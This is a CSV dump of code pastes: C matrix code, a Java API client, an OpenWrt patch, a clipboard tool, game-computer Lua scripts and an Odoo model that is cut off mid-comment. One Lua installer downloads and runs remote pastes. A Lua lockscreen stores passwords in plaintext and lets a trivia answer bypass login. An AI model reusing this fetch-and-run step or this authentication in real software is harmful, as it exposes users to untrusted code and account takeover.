id,title,username,language,date,content
bebXL3x9,Cross Linked List Implementataion of Matrix Multiplication,LambdaExpr_,C,Tuesday 30th of April 2024 12:58:04 AM CDT,"#include <stdio.h>
#include <stdlib.h>

typedef struct MatrixNode
{               //  matrix head   row head    column head    matrix node
    int row;    //  row count     row number  -1             row number
    int column; //  column count  -1          column number  column number
    int value;  //  node count    node count  node count     node value
    struct MatrixNode *right;
    struct MatrixNode *down;
} MatrixNode;

MatrixNode *newNode(int value);
void deleteNode(MatrixNode *this);
MatrixNode *modifyNode(MatrixNode *this, int new_value);

typedef MatrixNode *SparseMatrix;

SparseMatrix newSparseMatrix(int row, int col);
void deleteSparseMatrix(SparseMatrix this);
void MatrixInsertAdd(SparseMatrix this, int row, int col, int val);
SparseMatrix multiply(SparseMatrix this, SparseMatrix that);
SparseMatrix inputMatrix();

int main()
{
    SparseMatrix mat1 = inputMatrix();
    SparseMatrix mat2 = inputMatrix();

    SparseMatrix product = multiply(mat1, mat2);

    for (MatrixNode *row_it = product->down; row_it != product; row_it = row_it->down)
    {
        // printf(""row %d %d %d\n"", row_it->row, row_it->column, row_it->value);
        for (MatrixNode *col_it = row_it->right; col_it != row_it; col_it = col_it->right)
        {
            // printf(""col %d %d %d\n"", col_it->row, col_it->column, col_it->value);
            printf(""%d %d %d\n"", col_it->row, col_it->column, col_it->value);
        }
    }

    deleteSparseMatrix(mat1);
    deleteSparseMatrix(mat2);
    deleteSparseMatrix(product);
    return 0;
}

MatrixNode *newNode(int value)
{
    MatrixNode *node = (MatrixNode *)malloc(sizeof(MatrixNode));
    node->down = node->right = NULL;
    node->value = value;
    node->column = node->row = 0;
    return node;
}

MatrixNode *initNode(int row, int col, int value)
{
    MatrixNode *node = (MatrixNode *)malloc(sizeof(MatrixNode));
    node->row = row;
    node->column = col;
    node->value = value;
    node->right = node;
    node->down = node;
    return node;
}

void deleteNode(MatrixNode *this)
{
    if (this == NULL)
    {
        return;
    }
    free(this);
    this = NULL;
}

MatrixNode *modifyNode(MatrixNode *this, int new_value)
{
    if (this == NULL)
    {
        return NULL;
    }
    this->value = new_value;
    return this;
}

SparseMatrix newSparseMatrix(int row, int col)
{
    SparseMatrix matrix = initNode(row, col, 0);
    matrix->down = matrix->right = matrix;

    MatrixNode *itrator = matrix;
    for (int i = 0; i < col; ++i)
    {
        MatrixNode *col_head = initNode(-1, i, 0);
        col_head->down = col_head;
        col_head->right = matrix;
        itrator->right = col_head;
        itrator = itrator->right;
    }
    itrator = itrator->right;
    for (int i = 0; i < row; ++i)
    {
        MatrixNode *row_head = initNode(i, -1, 0);
        row_head->right = row_head;
        row_head->down = matrix;
        itrator->down = row_head;
        itrator = itrator->down;
    }
    itrator = itrator->down;
    return matrix;
}

void deleteSparseMatrix(SparseMatrix this)
{
    if (this == NULL)
    {
        return;
    }
    for (MatrixNode *p_col = this->right; p_col != this; p_col = p_col->right)
    {
        for (MatrixNode *p = p_col->down; p != p_col; p = p->down)
        {
            deleteNode(p);
        }
    }
    for (MatrixNode *p = this->right; p != this;)
    {
        MatrixNode *next = p->right;
        deleteNode(p);
        p = next;
    }
    for (MatrixNode *p = this->down; p != this;)
    {
        MatrixNode *next = p->down;
        deleteNode(p);
        p = next;
    }
    deleteNode(this);
}

void MatrixInsertAdd(SparseMatrix this, int row, int col, int val)
{
    // printf(""mat insert add\n"");
    if (this == NULL || row >= this->row || col >= this->column)
    {
        // printf(""here!!!\n"");
        return;
    }

    MatrixNode *row_head = this->down;
    // printf(""row head %d %d %d\n"", row_head->row, row_head->column, row_head->value);
    while (row_head->row < row)
    {
        row_head = row_head->down;
        // printf(""row head %d %d %d\n"", row_head->row, row_head->column, row_head->value);
    }
    MatrixNode *prow = row_head;
    // printf(""prow %d %d %d\n"", prow->row, prow->column, prow->value);
    while (prow->right->column >= 0 && prow->right->column <= col)
    {
        prow = prow->right;
        // printf(""prow %d %d %d\n"", prow->row, prow->column, prow->value);
    }

    MatrixNode *col_head = this->right;
    // printf(""col head %d %d %d\n"", col_head->row, col_head->column, col_head->value);
    while (col_head->column < col)
    {
        col_head = col_head->right;
        // printf(""col head %d %d %d\n"", col_head->row, col_head->column, col_head->value);
    }
    MatrixNode *pcol = col_head;
    // printf(""pcol %d %d %d\n"", pcol->row, pcol->column, pcol->value);
    while (pcol->down->row >= 0 && pcol->down->row <= row)
    {
        pcol = pcol->down;
        // printf(""pcol %d %d %d\n"", pcol->row, pcol->column, pcol->value);
    }

    if (prow == pcol)
    {
        // printf(""add\n\n"");
        prow->value += val;
        return;
    }

    MatrixNode *new_node = initNode(row, col, val);
    new_node->down = pcol->down;
    new_node->right = prow->right;
    pcol->down = new_node;
    prow->right = new_node;

    ++row_head->value;
    ++col_head->value;
    ++this->value;
    // printf(""insert\n\n"");
}

SparseMatrix multiply(SparseMatrix this, SparseMatrix that)
{
    if (this->column != that->row)
    {
        return NULL;
    }

    SparseMatrix product = newSparseMatrix(this->row, that->column);
    for (MatrixNode *it_row = this->down; it_row != this; it_row = it_row->down)
    {
        // printf(""it row %d %d %d\n"", it_row->row, it_row->column, it_row->value);
        for (MatrixNode *it_col = that->right; it_col != that; it_col = it_col->right)
        {
            // printf(""it col %d %d %d\n"", it_col->row, it_col->column, it_col->value);
            MatrixNode *multiplier = it_row->right;
            MatrixNode *multiplicant = it_col->down;
            for (int target_index = 0; target_index < this->column; ++target_index)
            {
                while (multiplier->column >= 0 && multiplier->column < target_index)
                {
                    // printf(""multiplier %d %d %d\n"", multiplier->row, multiplier->column, multiplier->value);
                    multiplier = multiplier->right;
                }
                while (multiplicant->row >= 0 && multiplicant->row < target_index)
                {
                    // printf(""multiplicant %d %d %d\n"", multiplicant->row, multiplicant->column, multiplicant->value);
                    multiplicant = multiplicant->down;
                }

                if (multiplier->column == multiplicant->row && multiplier->column != -1)
                {
                    // printf(""product at %d %d %d\n"", it_row->row, it_col->column,
                        //    multiplier->value * multiplicant->value);
                    MatrixInsertAdd(product, it_row->row, it_col->column,
                                    multiplier->value * multiplicant->value);
                    multiplier = multiplier->right;
                    multiplicant = multiplicant->down;
                }
            }
        }
    }
    return product;
}

SparseMatrix inputMatrix()
{
    int max_row, max_col;
    scanf(""%d%d"", &max_row, &max_col);
    SparseMatrix result = newSparseMatrix(++max_row, ++max_col);

    int row, col, val;
    scanf(""%d%d%d"", &row, &col, &val);
    while (row || col || val)
    {
        MatrixInsertAdd(result, row, col, val);
        scanf(""%d%d%d"", &row, &col, &val);
    }
    return result;
}
"
KDLwNMeK,interface ContactServerCommunication,GeorgePashev_88,Java,Tuesday 30th of April 2024 12:53:21 AM CDT,"package com.example.kontakti;

import okhttp3.OkHttpClient;
import retrofit2.Call;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public interface ContactServerCommunication {
    public interface ShowMessage{
        public void Message(String message);
    }
    public default void APICallInsert(ContactAPI.contacts contact, ShowMessage message){
        Thread t = new Thread(()->{
            try{
                OkHttpClient client = new OkHttpClient.Builder().build();
                Retrofit retrofit =
                        new Retrofit.Builder()
                                .baseUrl(""http://10.0.0.13:4041"")
                                .addConverterFactory(
                                        GsonConverterFactory.create()
                                )
                                .client(client)
                                .build();
                ContactAPI api = retrofit.create(ContactAPI.class);

                Call<ContactAPI.contacts> insertedUser = api.api_add_user(contact);
                Response<ContactAPI.contacts> r = insertedUser.execute();
                if(r.isSuccessful()){
                    ContactAPI.contacts resp =r.body();
                    message.Message(""INSERTED IN SERVER WITH ID = ""+resp.ID);
                }

            }catch (Exception e){
                message.Message(""ERROR FROM SERVER: ""+e.getLocalizedMessage());

            }

        });
        t.start();

    }


}
"
Dtfut8Lu,install.lua,BigLands,Lua,Tuesday 30th of April 2024 12:31:23 AM CDT,"local function get(file, code)
    if fs.exists(file) then
        fs.delete(file)
    end
    
    shell.run(""pastebin get "" .. code .. "" "" .. file)
end
 
local function makeFile(path, text)
    local file = io.open(path, ""w"")
    file:write(text)
    file:close()
end
 
get(""lockscreen"", ""LEbi6Uma"")
get(""startup"", ""ycLdFSDj"")
get(""version"", ""Q6PU5y1R"")
 
print(""Rebooting computer"")
 
sleep(3)
 
os.reboot()"
wN3HfuN6,clipboard_manager,Python253,Python,Tuesday 30th of April 2024 12:29:38 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: clipboard_manager.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script provides a simple clipboard manager for managing clipboard operations on Windows systems.

Requirements:
- Python 3.x
- pyperclip library (install via pip: pip install pyperclip)

Usage:
1. Run the script in a Python environment.
2. Follow the prompts to perform clipboard operations.

Functions:
1. get_clipboard(): Retrieves the content of the clipboard.
2. set_clipboard(content): Sets the content of the clipboard to the specified value.
3. clear_clipboard_history(): Clears the Windows clipboard history.
4. view_clipboard_history(): Simulates Win + V to open the clipboard history menu.
5. main(): Provides a command-line interface for interacting with the clipboard manager.

Additional Notes:
- This script is designed for Windows systems.
- Ensure that the pyperclip library is installed before running the script.
- The clipboard history feature relies on the Windows clipboard history functionality.
- Use this script to conveniently manage clipboard content without navigating through system menus.
""""""

import pyperclip
import subprocess
import os
import sys
import ctypes

def get_clipboard():
    """"""Retrieve the content of the clipboard.""""""
    return pyperclip.paste()

def set_clipboard(content):
    """"""Set the content of the clipboard to the specified value.""""""
    pyperclip.copy(content)

def clear_clipboard_history():
    """"""Clears the Windows clipboard history.""""""
    command = 'Restart-Service -Name ""cbdhsvc*"" -Force'
    try:
        subprocess.run(['powershell', '-Command', command], check=True)
        print(""\nClipboard history cleared successfully!\n"")
    except subprocess.CalledProcessError as e:
        print(f""\nError:\n{e}\n"")

def view_clipboard_history():
    """"""Simulates Win + V to open the clipboard history menu.""""""
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)  # Press Win key
    ctypes.windll.user32.keybd_event(0x56, 0, 0, 0)  # Press V key
    ctypes.windll.user32.keybd_event(0x56, 0, 2, 0)  # Release V key
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)  # Release Win key
    
def main():
    """"""
    Provides a command-line interface for interacting with the clipboard manager.
    
    Displays a menu of available actions and prompts the user to make a selection.
    The function executes the corresponding action based on the user's choice.
    
    Actions:
    - 1. Get clipboard content: Retrieves and displays the current content of the clipboard.
    - 2. Set clipboard content: Prompts the user to enter new content to set in the clipboard.
    - 3. View clipboard history: Simulates the Win + V keyboard shortcut to open the clipboard history menu.
    - 4. Clear clipboard history: Clears the Windows clipboard history using PowerShell.
    - 5. Exit the program: Exits the clipboard manager application.
    
    Note:
    - The user's input is validated to ensure it corresponds to one of the available options.
    - Invalid input prompts the user to select a valid option.
    - Upon selecting an action, the function executes the corresponding operation and provides feedback to the user.
    - The program terminates upon selecting the ""Exit"" option.
    """"""
    print(""\t:: Welcome to Clipboard Manager ::\n\n"")
    print(""Select an action:\n"")
    print(""\t1. Get clipboard content"")
    print(""\t2. Set clipboard content"")
    print(""\t3. View clipboard history"")
    print(""\t4. Clear clipboard history"")
    print(""\t5. Exit the program"")

    choice = input(""\n\tEnter your selection (1-5): "")

    if choice == '1':
        clipboard_content = get_clipboard()
        print(""\nClipboard content:\n"", clipboard_content)
    elif choice == '2':
        new_content = input(""\nEnter the new content for the clipboard: "")
        set_clipboard(new_content)
        print(""\nClipboard content set successfully!\n"")
    elif choice == '3':
        print(""\nSimulating Win + V to Open the clipboard history...\n"")
        view_clipboard_history()
    elif choice == '4':
        print(""\nClearing the clipboard history...\n"")
        clear_clipboard_history()
    elif choice == '5':
        print(""\nExiting the program...\tGoodbye!\n"")
        sys.exit()
    else:
        print(""\nInvalid choice!\nPlease select a valid option (1, 2, 3, 4 or 5)\n"")

if __name__ == ""__main__"":
    main()

"
LEbi6Uma,lockscreen.lua,BigLands,Lua,Tuesday 30th of April 2024 12:28:51 AM CDT,"-- Lock Screen Script

-- Function to clear the screen
local function clearScreen()
  term.setBackgroundColor(colors.blue)
  term.clear()
  term.setCursorPos(1, 1)
end

-- Function to draw the lock screen interface
local function drawLockScreen()
  clearScreen()
  term.setTextColor(colors.white)
  
  -- Draw lock screen elements
  term.setCursorPos(5, 5)
  term.write(""Username:"")
  term.setCursorPos(5, 7)
  term.write(""Password:"")
  
  -- Draw text boxes
  term.setCursorPos(17, 5)
  term.setBackgroundColor(colors.gray)
  term.write(""             "")  -- Blank text box for username
  term.setCursorPos(17, 7)
  term.write(""             "")  -- Blank text box for password
  
  -- Draw login button
  term.setCursorPos(12, 9)
  term.setBackgroundColor(colors.green)
  term.write(""Login"")
  
  -- Draw forgot password option
  term.setCursorPos(5, 11)
  term.setBackgroundColor(colors.red)
  term.write(""Forgot Password?"")
end

-- Function to handle mouse input
local function handleMouse()
  while true do
    local event, button, mx, my = os.pullEvent(""mouse_click"")
    
    if event == ""mouse_click"" then
      -- Check if mouse click is within text box for username
      if mx >= 17 and mx <= 30 and my == 5 then
        term.setCursorPos(17, 5)
        term.setBackgroundColor(colors.lightGray)
        term.write(""             "")  -- Clear text box
        term.setCursorPos(17, 5)
        local username = read()  -- Read username input
        term.setCursorPos(17, 5)
        term.setBackgroundColor(colors.gray)
        term.write(username)  -- Display entered username
      end
      
      -- Check if mouse click is within text box for password
      if mx >= 17 and mx <= 30 and my == 7 then
        term.setCursorPos(17, 7)
        term.setBackgroundColor(colors.lightGray)
        term.write(""             "")  -- Clear text box
        term.setCursorPos(17, 7)
        local password = read(""*"")  -- Read password input
        term.setCursorPos(17, 7)
        term.setBackgroundColor(colors.gray)
        term.write(string.rep(""*"", #password))  -- Display masked password
      end
      
      -- Check if mouse click is within login button
      if mx >= 12 and mx <= 17 and my == 9 then
        -- Perform login authentication
        local username = """"
        local password = """"
        
        -- Read entered username and password
        term.setCursorPos(17, 5)
        username = read()
        term.setCursorPos(17, 7)
        password = read(""*"")
        
        -- Check if user.lua exists
        if fs.exists(""user"") then
          local file = fs.open(""user"", ""r"")
          local userData = textutils.unserialize(file.readAll())
          file.close()
          
          -- Check if entered username exists and password matches
          if userData and userData[username] and userData[username] == password then
            clearScreen()
            print(""Login successful!"")
            sleep(2)
            return true
          else
            clearScreen()
            print(""Invalid username or password."")
            sleep(2)
            return false
          end
        else
          -- If user.lua doesn't exist, create it and add user data
          local file = fs.open(""user"", ""w"")
          if file then
            file.write(textutils.serialize({[username] = password}))
            file.close()
            clearScreen()
            print(""Account created successfully!"")
            sleep(2)
            return true
          else
            clearScreen()
            print(""Error creating account."")
            sleep(2)
            return false
          end
        end
      end
      
      -- Check if mouse click is within forgot password option
      if mx >= 5 and mx <= 20 and my == 11 then
        clearScreen()
        print(""To reset your password, solve the puzzle:"")
        -- Add your puzzle here
        -- For example:
        print(""What is the capital of France?"")
        local answer = read()
        if answer:lower() == ""paris"" then
          clearScreen()
          print(""Password reset successful!"")
          sleep(2)
          return true
        else
          clearScreen()
          print(""Incorrect answer. Please try again."")
          sleep(2)
          drawLockScreen()  -- Redraw lock screen
        end
      end
    end
  end
end

-- Main function to execute lock screen
local function main()
  drawLockScreen()
  while true do
    if handleMouse() then
      -- If login successful or password reset, exit lock screen
      shell.run(""desktop"")
      break
    else
      drawLockScreen()  -- Redraw lock screen
    end
  end
end

-- Run the main function
main()
"
DbCfk3v9,patch-mtk7630.patch,kosmik2001,C++,Tuesday 30th of April 2024 12:26:47 AM CDT,"diff -Naru build_ax23-v1-ap-a/target/linux/generic/hack-6.1/940-net-dsa-mt7530-use-switch-MDIO-bus-for-PHY-muxing.patch build_ax23-v1-ap-b/target/linux/generic/hack-6.1/940-net-dsa-mt7530-use-switch-MDIO-bus-for-PHY-muxing.patch
--- build_ax23-v1-ap-a/target/linux/generic/hack-6.1/940-net-dsa-mt7530-use-switch-MDIO-bus-for-PHY-muxing.patch	1970-01-01 03:00:00.000000000 +0300
+++ build_ax23-v1-ap-b/target/linux/generic/hack-6.1/940-net-dsa-mt7530-use-switch-MDIO-bus-for-PHY-muxing.patch	2024-04-30 08:01:42.514810164 +0300
@@ -0,0 +1,29 @@
+From 5f94d7358cceda721983b29245010a9d4ab0c808 Mon Sep 17 00:00:00 2001
+From: =?UTF-8?q?Ar=C4=B1n=C3=A7=20=C3=9CNAL?= <arinc.unal@arinc9.com>
+Date: Sun, 28 Apr 2024 13:38:46 +0300
+Subject: [PATCH] net: dsa: mt7530: use switch MDIO bus for PHY muxing
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Signed-off-by: Arınç ÜNAL <arinc.unal@arinc9.com>
+---
+ drivers/net/dsa/mt7530.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+diff --git a/drivers/net/dsa/mt7530.c b/drivers/net/dsa/mt7530.c
+index 7dc2f0ac8962..fa7a1ab292d2 100644
+--- a/drivers/net/dsa/mt7530.c
++++ b/drivers/net/dsa/mt7530.c
+@@ -2585,7 +2585,7 @@ mt7530_setup(struct dsa_switch *ds)
+ 			if (!phy_node)
+ 				continue;
+ 
+-			if (phy_node->parent == priv->dev->of_node->parent) {
++			if (phy_node->parent->parent == priv->dev->of_node) {
+ 				ret = of_get_phy_mode(mac_np, &interface);
+ 				if (ret && ret != -ENODEV) {
+ 					of_node_put(mac_np);
+-- 
+2.40.1
+
diff -Naru build_ax23-v1-ap-a/target/linux/ramips/dts/mt7621_mercusys_mr70x-v1.dts build_ax23-v1-ap-b/target/linux/ramips/dts/mt7621_mercusys_mr70x-v1.dts
--- build_ax23-v1-ap-a/target/linux/ramips/dts/mt7621_mercusys_mr70x-v1.dts	2024-02-24 01:30:57.232929535 +0300
+++ build_ax23-v1-ap-b/target/linux/ramips/dts/mt7621_mercusys_mr70x-v1.dts	2024-04-30 08:08:54.398642666 +0300
@@ -145,27 +145,48 @@
 	nvmem-cell-names = ""mac-address"";
 };
 
-&mdio {
-	ethphy0: ethernet-phy@0 {
-		reg = <0>;
-	};
-};
-
 &switch0 {
+	mdio {
+		#address-cells = <1>;
+		#size-cells = <0>;
+
+		ethphy0: ethernet-phy@0 {
+			reg = <0>;
+		};
+
+		ethphy1: ethernet-phy@1 {
+			reg = <1>;
+			interrupts = <1>;
+		};
+
+		ethphy2: ethernet-phy@2 {
+			reg = <2>;
+			interrupts = <2>;
+		};
+
+		ethphy3: ethernet-phy@3 {
+			reg = <3>;
+			interrupts = <3>;
+		};
+    };
+
 	ports {
 		port@1 {
 			status = ""okay"";
 			label = ""lan1"";
+			phy-handle = <&ethphy1>;
 		};
 
 		port@2 {
 			status = ""okay"";
 			label = ""lan2"";
+			phy-handle = <&ethphy2>;
 		};
 
 		port@3 {
 			status = ""okay"";
 			label = ""lan3"";
+			phy-handle = <&ethphy3>;
 		};
 	};
 };
diff -Naru build_ax23-v1-ap-a/target/linux/ramips/dts/mt7621_tplink_eap235-wall-v1.dts build_ax23-v1-ap-b/target/linux/ramips/dts/mt7621_tplink_eap235-wall-v1.dts
--- build_ax23-v1-ap-a/target/linux/ramips/dts/mt7621_tplink_eap235-wall-v1.dts	2024-02-24 01:30:57.240929468 +0300
+++ build_ax23-v1-ap-b/target/linux/ramips/dts/mt7621_tplink_eap235-wall-v1.dts	2024-04-30 08:13:31.371035141 +0300
@@ -189,27 +189,48 @@
 	nvmem-cell-names = ""mac-address"";
 };
 
-&mdio {
-	ethphy0: ethernet-phy@0 {
-		reg = <0>;
-	};
-};
-
 &switch0 {
+	mdio {
+		#address-cells = <1>;
+		#size-cells = <0>;
+
+		ethphy0: ethernet-phy@0 {
+			reg = <0>;
+		};
+
+		ethphy1: ethernet-phy@1 {
+			reg = <1>;
+			interrupts = <1>;
+		};
+
+		ethphy2: ethernet-phy@2 {
+			reg = <2>;
+			interrupts = <2>;
+		};
+
+		ethphy3: ethernet-phy@3 {
+			reg = <3>;
+			interrupts = <3>;
+		};
+    };
+
 	ports {
 		port@1 {
 			status = ""okay"";
 			label = ""lan3"";
+			phy-handle = <&ethphy1>;
 		};
 
 		port@2 {
 			status = ""okay"";
 			label = ""lan2"";
+			phy-handle = <&ethphy2>;
 		};
 
 		port@3 {
 			status = ""okay"";
 			label = ""lan1"";
+			phy-handle = <&ethphy3>;
 		};
 	};
 };"
ycLdFSDj,startup.lua,BigLands,Lua,Tuesday 30th of April 2024 12:20:28 AM CDT,"-- TacOS Startup Script

-- Function to clear the screen
local function clearScreen()
  term.clear()
  term.setCursorPos(1, 1)
end

-- Function to display the TacOS logo
local function displayLogo()
  clearScreen()
  print(""****************************************"")
  print(""*                                      *"")
  print(""*          Booting TacOS...            *"")
  print(""*                                      *"")
  print(""****************************************"")
  print()
end

-- Function to simulate loading
local function simulateLoading()
  local loadingMessages = {
    ""Loading modules..."",
    ""Initializing components..."",
    ""Configuring settings..."",
    ""Establishing connections..."",
    ""Preparing user interface..."",
    ""Finalizing boot sequence...""
  }

  for _, message in ipairs(loadingMessages) do
    clearScreen()
    print(message)
    sleep(1)  -- Simulate loading time
  end
end

-- Function to simulate a fake pause
local function simulatePause(seconds)
  clearScreen()
  print(""Please wait..."")
  sleep(seconds)
end

-- Function to check for updates
local function checkForUpdates()
  local localVersion = """"
  local onlineVersion = """"
  
  -- Check if version file exists locally
  if fs.exists(""version"") then
    local file = fs.open(""version"", ""r"")
    localVersion = file.readAll()
    file.close()
  else
    print(""Local version file not found."")
    return false
  end
  
  -- Fetch online version from Pastebin
  local response = http.get(""https://pastebin.com/raw/Q6PU5y1R"")
  if response then
    onlineVersion = response.readAll()
    response.close()
  else
    print(""Failed to fetch online version."")
    return false
  end
  
  -- Compare versions
  if localVersion == onlineVersion then
    print(""TacOS is up to date."")
    return true
  else
    print(""An update is available for TacOS."")
    return false
  end
end

-- Function to display the lock screen
local function displayLockScreen()
  shell.run(""lockscreen"")  -- Run the lock screen script
end

-- Main function to execute TacOS startup
local function main()
  displayLogo()
  
  if checkForUpdates() then
    simulateLoading()
    simulatePause(2)  -- Simulate a pause before displaying the lock screen
    displayLockScreen()
  else
    print(""Update TacOS to proceed."")
  end
end

-- Run the main function
main()
"
GbFhCqu4,Sales Contracts,Kenjx,Python,Tuesday 30th of April 2024 12:13:46 AM CDT,"class SaleContracts(models.Model):
    _name = ""sales.contracts""
    _inherit = [""mail.thread"", ""mail.activity.mixin"", ""utm.mixin""]
    _order = ""id desc""

    @api.depends(""payments"")
    def get_payments_total(self):
        """"""Calculate total payments.""""""
        for rec in self:
            rec.payments_total = sum(line.amount for line in rec.payments)

    @api.depends(""payments"", ""amount"")
    def get_balance_total(self):
        """"""Calculate total balance.""""""
        for rec in self:
            rec.balance_total = rec.amount - rec.payments_total

            # Check status of the contract
            rec._check_contract_status()

    name = fields.Char(
        string=""Contract No."", readonly=True, required=True, copy=False, default=""New""
    )
    chassis_no = fields.Char(""Chassis No"")

    def create_im4_bill(self):
        """"""Create IM4 Bill.""""""
        for item in self:
            if not item.im4:
                continue

            return {
                ""view_id"": self.env.ref(""carbiz_client.vehicle_im7_clearance_form1"").id,
                ""view_mode"": ""form"",
                ""res_model"": ""carbiz.t1"",
                ""res_id"": item.im4.id,
                ""type"": ""ir.actions.act_window"",
                ""target"": ""new"",
                ""context"": self._context,
            }

    def add_im4(self):
        for item in self:
            # Skip if IM4 already exists
            if item.im4:
                _logger.info(""IM4 already exists, checking its state..."")
                if item.state_im4 == ""draft"":
                    _logger.info(""IM4 is in draft state..."")
                    context = dict(self._context or {})
                    return {
                        # 'view_type': 'form',
                        ""view_id"": self.env.ref(
                            ""carbiz_client.vehicle_im4_clearance_form1""
                        ).id,
                        ""view_mode"": ""form"",
                        ""res_model"": ""carbiz.t1"",
                        ""res_id"": item.im4.id,
                        ""type"": ""ir.actions.act_window"",
                        ""target"": ""new"",
                        ""context"": context,
                    }
                continue

            # Search for car_id
            car_id = self.env[""carbiz_erp.vehicle""].search(
                [(""product"", ""="", item.product_id.id)], limit=1
            )

            # Check for existing IM4
            existing_im4 = self.env[""carbiz.t1""].search(
                [(""car_id"", ""="", car_id.id), (""state_im7"", ""="", ""im4"")], limit=1
            )
            if existing_im4:
                item.im4 = existing_im4.id
                item.im4.add_im4()
                continue

            # If there's no existing IM4, check for IM7
            existing_im7 = self.env[""carbiz.t1""].search(
                [
                    (""car_id"", ""="", car_id.id),
                    (""state_im7"", ""not in"", (""expired"", ""im4"", ""cancel"")),
                ],
                limit=1,
            )
            if existing_im7:
                item.im4 = existing_im7.id
                return existing_im7.add_im4()

            # If there's no IM7 or IM4 record for this vehicle, raise an error
            raise UserError(
                _(""There's no IM7 or IM4 record for this vehicle!\n Something is wrong!"")
            )

    im4 = fields.Many2one(""carbiz.t1"", string=""IM4"")
    im4_bill = fields.Many2one(
        ""account.move"", string=""IM4 Bill"", related=""im4.im4_bill"", store=True
    )
    im4_bill_state = fields.Selection(
        related=""im4_bill.payment_state"", store=True, string=""IM4 Bill State""
    )

    state_im4 = fields.Selection(
        [
            (""draft"", ""Draft""),
            (""confirm"", ""Validated""),
            (""cancel"", ""Canceled""),
        ],
        string=""IM4 Status"",
        related=""im4.state_im4"",
        store=True,
    )

    model = fields.Many2one(""fleet.vehicle.model"", ""Model"")
    product_id = fields.Many2one(""product.product"", ""Vehicle"")
    reg_no = fields.Many2one(""fleet.vehicle"", ""Reg No"")
    sales_person = fields.Many2one(""res.users"", ""Salesperson"")
    reg_type = fields.Selection(
        [
            (""localuse"", ""Local Use""),
            (""reexport"", ""Re-export""),
            (""taxfree"", ""Tax Free""),
        ],
        default=""localuse"",
        string=""Registration Type"",
    )
    color = fields.Char(""Colour"")
    file_no = fields.Char(""Origin"")

    customer = fields.Many2one(""res.partner"", string=""Purchaser"")
    address = fields.Char(""City"")
    phone = fields.Char(""Phone"", related=""customer.phone"")
    po_box = fields.Char(""Street"", related=""customer.street"")
    country_id = fields.Many2one(""res.country"", string=""Country"")
    sales_order = fields.Many2one(""sale.order"", string=""Origin"")
    delivery_count = fields.Integer(related=""sales_order.delivery_count"", store=True)
    invoice_count = fields.Integer(related=""sales_order.invoice_count"", store=True)
    start_date =  fields.Date(""Installment Start Date"", default=fields.Date.today())

    def action_view_delivery(self):
        return self.sales_order.action_view_delivery()

    def action_view_invoice(self):
        return self.sales_order.action_view_invoice()

    @api.depends(""customer_bills"")
    def _compute_customer_bills_count(self):
        """"""Compute customer bills count.""""""
        account_move = self.env[""account.move""]
        for record in self:
            record.bills_count = account_move.search_count(
                [(""contract_id"", ""="", record.id), (""move_type"", ""="", ""out_invoice"")]
            )

    @api.depends(""payments"")
    def _compute_customer_payments_count(self):
        """"""Compute customer payments count.""""""
        account_payment = self.env[""account.payment""]
        for record in self:
            record.payments_count = account_payment.search_count(
                [(""contract_id"", ""="", record.id)]
            )

            record._compute_delivery_request()

    @api.depends(""down_payment"")
    def _compute_delivery_request(self):
        for rec in self:
            # Balance Before Delivery sum
            beforedelivery_payment_amounts = sum(
                line.amount
                for line in rec.payments.filtered(
                    lambda pay: pay.carbiz_payment_type == ""balbeforedelivery""
                )
            )
        
            # Down Payments
            down_payment_amounts = sum(
                line.amount
                for line in rec.payments.filtered(
                    lambda pay: pay.carbiz_payment_type == ""downpayment""
                )
            )
            rec.make_delivery = False
            
            # Check if the total amount lets to cause delivery
            if down_payment_amounts == rec.down_payment and  (rec.balance > 0 and beforedelivery_payment_amounts == rec.balance):
                rec.make_delivery = True            
            elif down_payment_amounts == rec.down_payment and not rec.balance:
                rec.make_delivery = True
                
                

            # Check the car status, if in bond or not
            picking = rec.product_id.stock_move_ids.filtered(
                lambda car: car.product_id == rec.product_id
                and car.state == ""done""
                and car.picking_code == ""outgoing""
            )

            if not len(picking) == 0:
                rec.make_delivery = False

    product_id = fields.Many2one(""product.product"", string=""Product"")
    amount = fields.Float(""Amount in Figures"")
    payments_total = fields.Float(""Amount Paid"", compute=get_payments_total, store=True)
    balance_total = fields.Float(
        ""Total Amount Outstanding"", compute=get_balance_total, store=True
    )
    amount_words = fields.Char(""Amount in Words"", tracking=True)
    down_payment = fields.Float(""Down Payment"")
    balance = fields.Float(""Amount Before Delivery"")
    days_balance = fields.Integer(""Days to clear balance"")
    balance_installment = fields.Float(""Installment Balance"")
    days_installment = fields.Integer(""Days to clear installments"")
    days = fields.Integer(""Days to clear installment"")
    date_delivery = fields.Date(""Final Day Delivery"")
    date_installment = fields.Date(""Final Day Installment"")
    no_install = fields.Integer(""No. of Installments"")
    installment_lines = fields.One2many(
        ""install.line"", ""contract_id"", string=""Installments""
    )
    customer_bills = fields.One2many(
        ""account.move"", ""contract_id"", string=""Customer Bills""
    )
    payment_lines = fields.One2many(
        ""contract.payment"", ""contract_id"", string=""Payments""
    )
    payments = fields.One2many(
        ""account.payment"",
        ""contract_id"",
        string=""Payments"",
        domain=[(""state"", ""="", ""posted"")],
    )
    payments_count = fields.Integer(compute=""_compute_customer_payments_count"")
    # bills_count = fields.Integer(compute=""_compute_customer_bills_count"")
    make_delivery = fields.Boolean(
        default=False, compute=""_compute_delivery_request"", store=True
    )
    assigned = fields.Boolean(default=False)
    is_other_existing_contract = fields.Boolean(default=False)

    state = fields.Selection(
        [
            (""draft"", ""Draft""),
            (""running"", ""Running""),
            (""completed"", ""Completed""),
            (""cancelled"", ""Cancelled""),
        ],
        default=""draft"",
        string=""State"",
    )

    def create_delivery(self):
        """"""Create a delivery on demand""""""
        for rec in self.sales_order.order_line:
            if rec.product_id == self.product_id:
                rec._action_launch_stock_rule()
                self.make_delivery = False

    @api.depends(""balance_total"")
    def _check_contract_status(self):
        for rec in self:
            if (
                rec.balance_total == 0
                and rec.payments_total == rec.amount
                and rec.state == ""running""
            ):
                rec.state = ""completed""

    # def create_customer_bills(self):
    #     for contract in self:
    #         invoice_line_vals = []
    #         invoice_line_vals.append((0, 0, {
    #             'product_id': contract.product_id.id,
    #             'price_unit': contract.amount,
